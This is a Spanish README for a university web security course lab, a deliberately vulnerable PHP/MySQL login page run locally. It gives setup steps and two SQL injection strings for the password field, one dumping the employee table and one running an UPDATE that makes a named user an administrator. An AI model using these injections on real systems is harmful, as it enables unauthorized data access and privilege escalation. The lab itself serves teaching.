# WebSecurity
Practicas del curso de Web Security

Requerimientos:
- PHP 7.4.26
- mySQL 8.0.27

Montado de proyecto:

1.- para poder montar el proyecto, en este caso (localhost),
    es necesario desacrgar un interpretador de PHP, en nuestro caso
    fué WAMP
    
2.- Una vez configurado, se ingresan las carpetas del proyecto directamente
    en la carpeta correpondiente al interpretador para su uso en el servidor local
    
3.- Es necesario importar la base de datos usada en el proyecto, la cual se encuentra en
    las carpetas del proyecto
    
4.- Es necesario modificar el archivo conexionBase.php con los datos correpondientes 
    al servidor del usuario, dicho documento se encuentra en: WebSecurityP1\Conexiones\conexionBase.php
    
5.- la pagina principal de este escenario de pruebas es login.php

6.- las inyecciones SQL usadas son el en formulario de inicio de sesión (Login) y
    son las siguientes:
    
    ->Obtención de toda la tabla de empleados:
      -> Ingrese cualquier cosa en el input de correo
      -> Ingrese lo siguiente en el input de contraseña:
        ->cualquierCosa' OR '1'='1
        
    ->Modificación de datos existentes
      ->Ingrese cualquier cosa en el input de correo
      ->Ingrese lo siguiente en el input de contraseña:
        ->cualquierCosa' OR '1'='1'; UPDATE empleados SET esAdmin = 1 WHERE nombreEmpleado = 'Gustavo Romero
